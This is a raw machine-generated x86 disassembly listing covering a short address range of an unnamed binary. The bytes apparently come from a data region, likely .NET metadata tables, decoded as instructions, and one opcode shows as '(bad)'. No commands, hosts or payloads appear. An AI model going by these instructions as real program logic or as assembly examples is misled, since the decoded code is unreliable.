  405cea:	71 1e                	jno    0x405d0a
  405cec:	06                   	push   %es
  405ced:	00 7b 26             	add    %bh,0x26(%ebx)
  405cf0:	2b 00                	sub    (%eax),%eax
  405cf2:	16                   	push   %ss
  405cf3:	00 aa 1f a8 0a 06    	add    %ch,0x60aa81f(%edx)
  405cf9:	00 5f 16             	add    %bl,0x16(%edi)
  405cfc:	2b 00                	sub    (%eax),%eax
  405cfe:	06                   	push   %es
  405cff:	00 fa                	add    %bh,%dl
  405d01:	0d a8 05 06 00       	or     $0x605a8,%eax
  405d06:	06                   	push   %es
  405d07:	18 a8 05 06 00 f4    	sbb    %ch,-0xbfff9fb(%eax)
  405d0d:	0c a8                	or     $0xa8,%al
  405d0f:	05 06 00 95 1d       	add    $0x1d950006,%eax
  405d14:	a8 05                	test   $0x5,%al
  405d16:	06                   	push   %es
  405d17:	00 eb                	add    %ch,%bl
  405d19:	1a a8 05 16 00 04    	sbb    0x4001605(%eax),%ch
  405d1f:	1b 84 1e 1a 00 3b 1d 	sbb    0x1d3b001a(%esi,%ebx,1),%eax
  405d26:	39 22                	cmp    %esp,(%edx)
  405d28:	1a 00                	sbb    (%eax),%al
  405d2a:	31 1a                	xor    %ebx,(%edx)
  405d2c:	39 22                	cmp    %esp,(%edx)
  405d2e:	8b 01                	mov    (%ecx),%eax
  405d30:	c7                   	(bad)
  405d31:	1d 00 00 1a 00       	sbb    $0x1a0000,%eax
  405d36:	3c 21                	cmp    $0x21,%al
  405d38:	39 22                	cmp    %esp,(%edx)
  405d3a:	06                   	push   %es
  405d3b:	00 4e 1e             	add    %cl,0x1e(%esi)
  405d3e:	88 18                	mov    %bl,(%eax)
  405d40:	06                   	push   %es
  405d41:	00 46 00             	add    %al,0x0(%esi)
  405d44:	88 18                	mov    %bl,(%eax)
  405d46:	06                   	push   %es
  405d47:	00 7f 18             	add    %bh,0x18(%edi)
  405d4a:	88 18                	mov    %bl,(%eax)
  405d4c:	06                   	push   %es
  405d4d:	00 70 00             	add    %dh,0x0(%eax)
  405d50:	88 18                	mov    %bl,(%eax)
  405d52:	06                   	push   %es
  405d53:	00 82 1c 04 26 06    	add    %al,0x626041c(%edx)
  405d59:	00 b6 18 04 26 06    	add    %dh,0x6260418(%esi)
  405d5f:	00 e1                	add    %ah,%cl
  405d61:	0e                   	push   %cs
  405d62:	88 18                	mov    %bl,(%eax)
  405d64:	06                   	push   %es
  405d65:	00 45 19             	add    %al,0x19(%ebp)
  405d68:	88 18                	mov    %bl,(%eax)
  405d6a:	1e                   	push   %ds
  405d6b:	00 da                	add    %bl,%dl
  405d6d:	19 09                	sbb    %ecx,(%ecx)
  405d6f:	20 06                	and    %al,(%esi)
  405d71:	00 cc                	add    %cl,%ah
  405d73:	26 1e                	es push %ds
  405d75:	17                   	pop    %ss
  405d76:	06                   	push   %es
  405d77:	00 38                	add    %bh,(%eax)
  405d79:	17                   	pop    %ss
  405d7a:	1e                   	push   %ds
  405d7b:	17                   	pop    %ss
  405d7c:	06                   	push   %es
  405d7d:	00 08                	add    %cl,(%eax)
  405d7f:	0e                   	push   %cs
  405d80:	1e                   	push   %ds
  405d81:	17                   	pop    %ss
  405d82:	06                   	push   %es
  405d83:	00 64 0b 88          	add    %ah,-0x78(%ebx,%ecx,1)
  405d87:	18 06                	sbb    %al,(%esi)
  405d89:	00 e6                	add    %ah,%dh
  405d8b:	0d 56 13 0a 00       	or     $0xa1356,%eax
  405d90:	54                   	push   %esp
  405d91:	1d 2b 00 0a 00       	sbb    $0xa002b,%eax
  405d96:	d7                   	xlat   %ds:(%ebx)
  405d97:	20 2b                	and    %ch,(%ebx)
  405d99:	00 06                	add    %al,(%esi)
  405d9b:	00 92 0c 2b 00 43    	add    %dl,0x43002b0c(%edx)
  405da1:	00 04 1e             	add    %al,(%esi,%ebx,1)
  405da4:	00 00                	add    %al,(%eax)
  405da6:	12 00                	adc    (%eax),%al
  405da8:	74 0d                	je     0x405db7
  405daa:	1c 1c                	sbb    $0x1c,%al
  405dac:	06                   	push   %es
  405dad:	00 0b                	add    %cl,(%ebx)
  405daf:	00 8d 0a 06 00 79    	add    %cl,0x7900060a(%ebp)
  405db5:	19 88 18 06 00 2f    	sbb    %ecx,0x2f000618(%eax)
  405dbb:	26 05 1a 06 00 65    	es add $0x6500061a,%eax
  405dc1:	0f 88 18 06 00 0f    	js     0xf4063df
  405dc7:	1e                   	push   %ds
  405dc8:	88 18                	mov    %bl,(%eax)
  405dca:	06                   	push   %es
  405dcb:	00 c2                	add    %al,%dl
  405dcd:	0d 88 18 22 00       	or     $0x221888,%eax
  405dd2:	11 1b                	adc    %ebx,(%ebx)
  405dd4:	db 1c 22             	fistpl (%edx,%eiz,1)
  405dd7:	00 80 1f db 1c 22    	add    %al,0x221cdb1f(%eax)
  405ddd:	00 02                	add    %al,(%edx)
  405ddf:	1d db 1c 12 00       	sbb    $0x121cdb,%eax
  405de4:	fa                   	cli
  405de5:	1c c1                	sbb    $0xc1,%al
  405de7:	1e                   	push   %ds
  405de8:	22 00                	and    (%eax),%al
  405dea:	98                   	cwtl
  405deb:	1f                   	pop    %ds
  405dec:	db 1c 06             	fistpl (%esi,%eax,1)
  405def:	00 57 1f             	add    %dl,0x1f(%edi)
  405df2:	04 26                	add    $0x26,%al
  405df4:	06                   	push   %es
  405df5:	00 86 1a 88 18 06    	add    %al,0x618881a(%esi)
  405dfb:	00 5e 1f             	add    %bl,0x1f(%esi)
  405dfe:	04 26                	add    $0x26,%al
  405e00:	12 00                	adc    (%eax),%al
  405e02:	b4 1c                	mov    $0x1c,%ah
  405e04:	04 26                	add    $0x26,%al
  405e06:	06                   	push   %es
  405e07:	00 29                	add    %ch,(%ecx)
  405e09:	18 04 26             	sbb    %al,(%esi,%eiz,1)
  405e0c:	06                   	push   %es
  405e0d:	00 87 00 04 26 06    	add    %al,0x6260400(%edi)
  405e13:	00 70 1a             	add    %dh,0x1a(%eax)
  405e16:	88 18                	mov    %bl,(%eax)
  405e18:	06                   	push   %es
  405e19:	00 8f 18 04 26 06    	add    %cl,0x6260418(%edi)
  405e1f:	00 39                	add    %bh,(%ecx)
  405e21:	0d 04 26 06 00       	or     $0x62604,%eax
  405e26:	fd                   	std
  405e27:	0c 04                	or     $0x4,%al
  405e29:	26 06                	es push %es
  405e2b:	00 de                	add    %bl,%dh
  405e2d:	18 04 26             	sbb    %al,(%esi,%eiz,1)
  405e30:	06                   	push   %es
  405e31:	00 18                	add    %bl,(%eax)
  405e33:	0d 04 26 06 00       	or     $0x62604,%eax
  405e38:	59                   	pop    %ecx
  405e39:	1a 04 26             	sbb    (%esi,%eiz,1),%al
  405e3c:	06                   	push   %es
  405e3d:	00 18                	add    %bl,(%eax)
  405e3f:	1d 88 18 06 00       	sbb    $0x61888,%eax
  405e44:	bc 25 88 18 06       	mov    $0x6188825,%esp
  405e49:	00 62 20             	add    %ah,0x20(%edx)
  405e4c:	c1 1e 06             	rcrl   $0x6,(%esi)
  405e4f:	00 9f 0d 88 18 06    	add    %bl,0x618880d(%edi)
  405e55:	00 24 0b             	add    %ah,(%ebx,%ecx,1)
  405e58:	04 26                	add    $0x26,%al
  405e5a:	06                   	push   %es
  405e5b:	00 67 00             	add    %ah,0x0(%edi)
  405e5e:	88 18                	mov    %bl,(%eax)
  405e60:	06                   	push   %es
  405e61:	00 8d 0d 88 18 06    	add    %cl,0x618880d(%ebp)
  405e67:	00 f3                	add    %dh,%bl
  405e69:	0d 88 18 06 00       	or     $0x61888,%eax
  405e6e:	81 20 a8 05 06 00    	andl   $0x605a8,(%eax)
  405e74:	76 0f                	jbe    0x405e85
  405e76:	a8 05                	test   $0x5,%al
  405e78:	0a 00                	or     (%eax),%al
  405e7a:	36 18 c4             	ss sbb %al,%ah
  405e7d:	19 0a                	sbb    %ecx,(%edx)
  405e7f:	00 29                	add    %ch,(%ecx)
  405e81:	0d c4 19 00 00       	or     $0x19c4,%eax
  405e86:	00 00                	add    %al,(%eax)
  405e88:	9b                   	fwait
  405e89:	00 00                	add    %al,(%eax)
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 aa 06 b8 12 05    	add    %ch,0x512b806(%edx)
  405e9b:	00 01                	add    %al,(%ecx)
  405e9d:	00 01                	add    %al,(%ecx)
  405e9f:	00 81 01 10 00 96    	add    %al,-0x69ffefff(%ecx)
  405ea5:	16                   	push   %ss
  405ea6:	b8 12 05 00 01       	mov    $0x1000512,%eax
  405eab:	00 03                	add    %al,(%ebx)
  405ead:	00 81 01 10 00 66    	add    %al,0x66001001(%ecx)
  405eb3:	23 d5                	and    %ebp,%edx
  405eb5:	11 05 00 13 00 06    	adc    %eax,0x6001300
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 48 05             	add    %cl,0x5(%eax)
  405ec2:	61                   	popa
  405ec3:	06                   	push   %es
  405ec4:	05 00 1e 00 24       	add    $0x24001e00,%eax
  405ec9:	00 00                	add    %al,(%eax)
  405ecb:	00 10                	add    %dl,(%eax)
  405ecd:	00 8a 16 ba 06 05    	add    %cl,0x506ba16(%edx)
  405ed3:	00 1e                	add    %bl,(%esi)
  405ed5:	00 26                	add    %ah,(%esi)
  405ed7:	00 81 01 10 00 1a    	add    %al,0x1a001001(%ecx)
  405edd:	06                   	push   %es
  405ede:	ba 06 05 00 1e       	mov    $0x1e000506,%edx
  405ee3:	00 2d 00 81 01 10    	add    %ch,0x10018100
  405ee9:	00 e5                	add    %ah,%ch
  405eeb:	06                   	push   %es
  405eec:	ba 06 05 00 1e       	mov    $0x1e000506,%edx
  405ef1:	00 2f                	add    %ch,(%edi)
  405ef3:	00 81 01 10 00 4c    	add    %al,0x4c001001(%ecx)
  405ef9:	0a ba 06 05 00 1e    	or     0x1e000506(%edx),%bh
  405eff:	00 30                	add    %dh,(%eax)
  405f01:	00 81 01 10 00 ec    	add    %al,-0x13ffefff(%ecx)
  405f07:	12 ba 06 05 00 1e    	adc    0x1e000506(%edx),%bh
  405f0d:	00 36                	add    %dh,(%esi)
  405f0f:	00 81 01 10 00 35    	add    %al,0x35001001(%ecx)
  405f15:	1c ba                	sbb    $0xba,%al
  405f17:	06                   	push   %es
  405f18:	05 00 1f 00 38       	add    $0x38001f00,%eax
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 06                	add    %al,(%esi)
  405f23:	04 00                	add    $0x0,%al
  405f25:	00 39                	add    %bh,(%ecx)
  405f27:	00 1f                	add    %bl,(%edi)
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 33    	add    %al,0x33001001(%ecx)
  405f31:	19 ba 06 05 00 23    	sbb    %edi,0x23000506(%edx)
  405f37:	00 3e                	add    %bh,(%esi)
  405f39:	00 81 01 10 00 c2    	add    %al,-0x3dffefff(%ecx)
  405f3f:	01 ba 06 05 00 23    	add    %edi,0x23000506(%edx)
  405f45:	00 41 00             	add    %al,0x0(%ecx)
  405f48:	81 01 10 00 d9 08    	addl   $0x8d90010,(%ecx)
  405f4e:	ca 16 05             	lret   $0x516
  405f51:	00 24 00             	add    %ah,(%eax,%eax,1)
  405f54:	46                   	inc    %esi
  405f55:	00 83 01 10 00 ff    	add    %al,-0xffefff(%ebx)
  405f5b:	05 00 00 05 00       	add    $0x50000,%eax
  405f60:	25 00 4b 00 01       	and    $0x1004b00,%eax
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 20                	add    %ah,(%eax)
  405f69:	25 da 15 05 00       	and    $0x515da,%eax
  405f6e:	26 00 4b 00          	add    %cl,%es:0x0(%ebx)
  405f72:	81 01 10 00 30 04    	addl   $0x4300010,(%ecx)
  405f78:	da 15 05 00 2d 00    	ficoml 0x2d0005
  405f7e:	52                   	push   %edx
  405f7f:	00 00                	add    %al,(%eax)
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 97 08 00 00 05    	add    %dl,0x5000008(%edi)
  405f89:	00 2d 00 54 00 13    	add    %ch,0x13005400
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 da                	add    %bl,%dl
  405f93:	0c 00                	or     $0x0,%al
  405f95:	00 51 00             	add    %dl,0x0(%ecx)
  405f98:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 4a 02             	add    %cl,0x2(%edx)
  405fa2:	06                   	push   %es
  405fa3:	03 05 00 2e 00 54    	add    0x54002e00,%eax
  405fa9:	00 01                	add    %al,(%ecx)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 43 07             	add    %al,0x7(%ebx)
  405fb0:	06                   	push   %es
  405fb1:	03 05 00 2f 00 5f    	add    0x5f002f00,%eax
  405fb7:	00 01                	add    %al,(%ecx)
  405fb9:	00 10                	add    %dl,(%eax)
  405fbb:	00 e9                	add    %ch,%cl
  405fbd:	15 06 03 05 00       	adc    $0x50306,%eax
  405fc2:	31 00                	xor    %eax,(%eax)
  405fc4:	63 00                	arpl   %eax,(%eax)
  405fc6:	01 00                	add    %eax,(%eax)
  405fc8:	10 00                	adc    %al,(%eax)
  405fca:	7d 06                	jge    0x405fd2
  405fcc:	06                   	push   %es
  405fcd:	03 05 00 33 00 6a    	add    0x6a003300,%eax
  405fd3:	00 01                	add    %al,(%ecx)
  405fd5:	01 00                	add    %eax,(%eax)
  405fd7:	00 47 15             	add    %al,0x15(%edi)
  405fda:	06                   	push   %es
  405fdb:	03 39                	add    (%ecx),%edi
  405fdd:	00 3a                	add    %bh,(%edx)
  405fdf:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405fe5:	00 be 16 06 03 05    	add    %bh,0x5030616(%esi)
  405feb:	00 47 00             	add    %al,0x0(%edi)
  405fee:	95                   	xchg   %eax,%ebp
  405fef:	00 00                	add    %al,(%eax)
  405ff1:	00 10                	add    %dl,(%eax)
  405ff3:	00 03                	add    %al,(%ebx)
  405ff5:	16                   	push   %ss
  405ff6:	06                   	push   %es
  405ff7:	03 05 00 47 00 99    	add    0x99004700,%eax
  405ffd:	00 81 01 10 00 98    	add    %al,-0x67ffefff(%ecx)
  406003:	1a 06                	sbb    (%esi),%al
  406005:	03 05 00 47 00 a2    	add    0xa2004700,%eax
  40600b:	00 00                	add    %al,(%eax)
  40600d:	01 00                	add    %eax,(%eax)
  40600f:	00 81 25 00 00 05    	add    %al,0x5000025(%ecx)
  406015:	00 47 00             	add    %al,0x0(%edi)
  406018:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 11                	add    %dl,(%ecx)
  40601f:	09 00                	or     %eax,(%eax)
  406021:	00 51 00             	add    %dl,0x0(%ecx)
  406024:	48                   	dec    %eax
  406025:	00 a4 00 16 00 c1 05 	add    %ah,0x5c10016(%eax,%eax,1)
  40602c:	12 00                	adc    (%eax),%al
  40602e:	16                   	push   %ss
  40602f:	00 ce                	add    %cl,%dh
  406031:	01 12                	add    %edx,(%edx)
  406033:	00 16                	add    %dl,(%esi)
  406035:	00 43 1b             	add    %al,0x1b(%ebx)
  406038:	12 00                	adc    (%eax),%al
  40603a:	16                   	push   %ss
  40603b:	00 8f 1b 12 00 16    	add    %cl,0x1600121b(%edi)
  406041:	00 6e 15             	add    %ch,0x15(%esi)
  406044:	12 00                	adc    (%eax),%al
  406046:	16                   	push   %ss
  406047:	00 ac 07 12 00 16 00 	add    %ch,0x160012(%edi,%eax,1)
  40604e:	5a                   	pop    %edx
  40604f:	04 12                	add    $0x12,%al
  406051:	00 16                	add    %dl,(%esi)
  406053:	00 06                	add    %al,(%esi)
  406055:	27                   	daa
  406056:	12 00                	adc    (%eax),%al
  406058:	16                   	push   %ss
  406059:	00 d8                	add    %bl,%al
  40605b:	0a 12                	or     (%edx),%dl
  40605d:	00 16                	add    %dl,(%esi)
  40605f:	00 51 06             	add    %dl,0x6(%ecx)
  406062:	12 00                	adc    (%eax),%al
  406064:	16                   	push   %ss
  406065:	00 b4 0c 15 00 16 00 	add    %dh,0x160015(%esp,%ecx,1)
  40606c:	f6 26                	mulb   (%esi)
  40606e:	12 00                	adc    (%eax),%al
  406070:	16                   	push   %ss
  406071:	00 db                	add    %bl,%bl
  406073:	17                   	pop    %ss
  406074:	19 00                	sbb    %eax,(%eax)
  406076:	16                   	push   %ss
  406077:	00 17                	add    %dl,(%edi)
  406079:	0a 12                	or     (%edx),%dl
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 fb                	add    %bh,%bl
  40607f:	07                   	pop    %es
  406080:	12 00                	adc    (%eax),%al
  406082:	16                   	push   %ss
  406083:	00 9a 15 12 00 16    	add    %bl,0x16001215(%edx)
  406089:	00 b1 16 12 00 16    	add    %dh,0x16001216(%ecx)
  40608f:	00 0e                	add    %cl,(%esi)
  406091:	1c 12                	sbb    $0x12,%al
  406093:	00 11                	add    %dl,(%ecx)
  406095:	00 70 0c             	add    %dh,0xc(%eax)
  406098:	21 00                	and    %eax,(%eax)
  40609a:	11 00                	adc    %eax,(%eax)
  40609c:	55                   	push   %ebp
  40609d:	0c 25                	or     $0x25,%al
  40609f:	00 11                	add    %dl,(%ecx)
  4060a1:	00 25 0c 29 00 11    	add    %ah,0x1100290c
  4060a7:	00 bb 0b 2d 00 11    	add    %bh,0x11002d0b(%ebx)
  4060ad:	00 3d 0c 2d 00 11    	add    %bh,0x11002d0c
  4060b3:	00 a0 0b 30 00 11    	add    %ah,0x1100300b(%eax)
  4060b9:	00 83 0b 34 00 31    	add    %al,0x3100340b(%ebx)
  4060bf:	00 69 0b             	add    %ch,0xb(%ecx)
  4060c2:	37                   	aaa
  4060c3:	00 11                	add    %dl,(%ecx)
  4060c5:	00 d7                	add    %dl,%bh
  4060c7:	0b 30                	or     (%eax),%esi
  4060c9:	00 11                	add    %dl,(%ecx)
  4060cb:	00 0b                	add    %cl,(%ebx)
  4060cd:	0c 3a                	or     $0x3a,%al
  4060cf:	00 11                	add    %dl,(%ecx)
  4060d1:	00 ed                	add    %ch,%ch
  4060d3:	0b 34 00             	or     (%eax,%eax,1),%esi
  4060d6:	16                   	push   %ss
  4060d7:	00 b2 03 dc 00 06    	add    %dh,0x600dc03(%edx)
  4060dd:	06                   	push   %es
  4060de:	b8 09 06 01 56       	mov    $0x56010609,%eax
  4060e3:	80 ae 23 09 01 56 80 	subb   $0x80,0x56010923(%esi)
  4060ea:	3d 02 09 01 56       	cmp    $0x56010902,%eax
  4060ef:	80 8e 01 09 01 31 00 	orb    $0x0,0x31010901(%esi)
  4060f6:	f2 05 12 00 16 00    	repnz add $0x160012,%eax
  4060fc:	df 02                	filds  (%edx)
  4060fe:	30 01                	xor    %al,(%ecx)
  406100:	16                   	push   %ss
  406101:	00 b9 04 43 01 51    	add    %bh,0x51014304(%ecx)
  406107:	80 82 0a 3a 00 51 80 	addb   $0x80,0x51003a0a(%edx)
  40610e:	91                   	xchg   %eax,%ecx
  40610f:	25 3a 00 51 80       	and    $0x8051003a,%eax
  406114:	aa                   	stos   %al,%es:(%edi)
  406115:	17                   	pop    %ss
  406116:	3a 00                	cmp    (%eax),%al
  406118:	51                   	push   %ecx
  406119:	80 d4 07             	adc    $0x7,%ah
  40611c:	3a 00                	cmp    (%eax),%al
  40611e:	21 00                	and    %eax,(%eax)
  406120:	eb 17                	jmp    0x406139
  406122:	29 00                	sub    %eax,(%eax)
  406124:	21 00                	and    %eax,(%eax)
  406126:	81 04 29 00 31 00 fc 	addl   $0xfc003100,(%ecx,%ebp,1)
  40612d:	09 29                	or     %ebp,(%ecx)
  40612f:	00 33                	add    %dh,(%ebx)
  406131:	01 c9                	add    %ecx,%ecx
  406133:	1b 8b 01 11 00 4a    	sbb    0x4a001101(%ebx),%ecx
  406139:	09 8f 01 01 00 05    	or     %ecx,0x5000101(%edi)
  40613f:	02 30                	add    (%eax),%dh
  406141:	01 01                	add    %eax,(%ecx)
  406143:	00 61 05             	add    %ah,0x5(%ecx)
  406146:	3a 00                	cmp    (%eax),%al
  406148:	01 00                	add    %eax,(%eax)
  40614a:	05 02 30 01 01       	add    $0x1013002,%eax
  40614f:	00 fd                	add    %bh,%ch
  406151:	24 c7                	and    $0xc7,%al
  406153:	01 01                	add    %eax,(%ecx)
  406155:	00 61 07             	add    %ah,0x7(%ecx)
  406158:	12 00                	adc    (%eax),%al
  40615a:	01 00                	add    %eax,(%eax)
  40615c:	e7 0a                	out    %eax,$0xa
  40615e:	12 00                	adc    (%eax),%al
  406160:	01 00                	add    %eax,(%eax)
  406162:	90                   	nop
  406163:	12 37                	adc    (%edi),%dh
  406165:	00 01                	add    %al,(%ecx)
  406167:	00 9d 04 02 02 01    	add    %bl,0x1020204(%ebp)
  40616d:	00 10                	add    %dl,(%eax)
  40616f:	01 c7                	add    %eax,%edi
  406171:	01 01                	add    %eax,(%ecx)
  406173:	00 05 02 30 01 01    	add    %al,0x1013002
  406179:	00 1d 01 06 02 06    	add    %bl,0x6020601
  40617f:	06                   	push   %es
  406180:	b8 09 3a 00 56       	mov    $0x56003a09,%eax
  406185:	80 30 02             	xorb   $0x2,(%eax)
  406188:	02 02                	add    (%edx),%al
  40618a:	56                   	push   %esi
  40618b:	80 83 09 02 02 56 80 	addb   $0x80,0x56020209(%ebx)
  406192:	3a 25 02 02 56 80    	cmp    0x80560202,%ah
  406198:	8a 08                	mov    (%eax),%cl
  40619a:	02 02                	add    (%edx),%al
  40619c:	56                   	push   %esi
  40619d:	80 2f 25             	subb   $0x25,(%edi)
  4061a0:	02 02                	add    (%edx),%al
  4061a2:	56                   	push   %esi
  4061a3:	80 cd 00             	or     $0x0,%ch
  4061a6:	02 02                	add    (%edx),%al
  4061a8:	56                   	push   %esi
  4061a9:	80 50 1c 02          	adcb   $0x2,0x1c(%eax)
  4061ad:	02 56 80             	add    -0x80(%esi),%dl
  4061b0:	f9                   	stc
  4061b1:	03 02                	add    (%edx),%eax
  4061b3:	02 56 80             	add    -0x80(%esi),%dl
  4061b6:	83 1b 02             	sbbl   $0x2,(%ebx)
  4061b9:	02 56 80             	add    -0x80(%esi),%dl
  4061bc:	03 24 02             	add    (%edx,%eax,1),%esp
  4061bf:	02 56 80             	add    -0x80(%esi),%dl
  4061c2:	eb 20                	jmp    0x4061e4
  4061c4:	02 02                	add    (%edx),%al
  4061c6:	56                   	push   %esi
  4061c7:	80 c7 14             	add    $0x14,%bh
  4061ca:	02 02                	add    (%edx),%al
  4061cc:	33 01                	xor    (%ecx),%eax
  4061ce:	aa                   	stos   %al,%es:(%edi)
  4061cf:	04 fd                	add    $0xfd,%al
  4061d1:	02 08                	add    (%eax),%cl
  4061d3:	26 00 00             	add    %al,%es:(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 6a 19             	add    %ch,0x19(%edx)
  4061dc:	0a 00                	or     (%eax),%al
  4061de:	01 00                	add    %eax,(%eax)
  4061e0:	78 20                	js     0x406202
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	19 1e                	sbb    %ebx,(%esi)
  4061ea:	0e                   	push   %cs
  4061eb:	00 01                	add    %al,(%ecx)
  4061ed:	00 f8                	add    %bh,%al
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 72 01             	add    %dh,0x1(%edx)
  4061f8:	1d 00 01 00 50       	sbb    $0x50000100,%eax
  4061fd:	28 00                	sub    %al,(%eax)
  4061ff:	00 00                	add    %al,(%eax)
  406201:	00 91 00 14 04 1d    	add    %dl,0x1d041400(%ecx)
  406207:	00 01                	add    %al,(%ecx)
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 1f 1e 0a    	add    %dl,0xa1e1f18(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 08 22 3d    	add    %dl,0x3d220808(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 16 22 42    	add    %dl,0x42221608(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 ec 21 48    	add    %dl,0x4821ec08(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 fa 21 4d    	add    %dl,0x4d21fa08(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 09 1d 53    	add    %dl,0x531d0908(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 14 1d 58    	add    %dl,0x581d1408(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 1f 12 5e    	add    %dl,0x5e121f08(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 2e                	or     %ch,(%esi)
  406283:	12 62 00             	adc    0x0(%edx),%ah
  406286:	04 00                	add    $0x0,%al
  406288:	bc 20 00 00 00       	mov    $0x20,%esp
  40628d:	00 91 08 a3 21 5e    	add    %dl,0x5e21a308(%ecx)
  406293:	00 05 00 c3 20 00    	add    %al,0x20c300
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 ae 21 62    	add    %dl,0x6221ae08(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 e0 11 67    	add    %dl,0x6711e008(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 ee 11 6c    	add    %dl,0x6c11ee08(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 40 0b 1d    	add    %dl,0x1d0b4008(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 50 0b 72    	add    %dl,0x720b5008(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 be 0a 77    	add    %dl,0x770abe08(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 44 13 67    	add    %dl,0x67134408(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 4d 13 6c    	add    %dl,0x6c134d08(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 49 17 7b    	add    %dl,0x7b174908(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 56 17 7f    	add    %dl,0x7f175608(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 38 14 1d    	add    %dl,0x1d143808(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 49 14 72    	add    %dl,0x72144908(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 6e 17 0a    	add    %dl,0xa176e00(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 5e 08 84    	add    %dl,-0x7bf7a200(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 cf 02 89    	add    %dl,-0x76fd3100(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
